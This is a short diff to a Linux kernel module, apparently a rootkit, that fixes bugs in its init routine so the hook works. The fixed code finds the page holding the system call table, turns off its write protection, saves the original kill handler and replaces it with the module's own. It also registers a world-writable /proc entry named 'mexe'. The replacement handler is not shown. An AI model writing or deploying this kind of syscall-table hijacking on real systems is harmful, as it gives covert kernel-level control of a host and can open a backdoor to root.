@@ -94,15 +94,15 @@ static const struct file_operations m_fops = {
 
 static 
 int __init m_init(void) {
-	unsinged int level;
-	pte_t pte;
+	unsigned int level;
+	pte_t* pte;
 	proc_create("mexe", S_IRUGO | S_IWUGO, NULL, &m_fops) ;
 
 	orig_sys_kill = sctable[__NR_kill];
 	pte = lookup_address((unsigned long) sctable, &level);
 	if(pte->pte &~ _PAGE_RW)
 		pte->pte |= _PAGE_RW;
-	sctable[__NR_open] = m_sys_kill;
+	sctable[__NR_kill] = m_sys_kill;
 
 	return 0;
 }
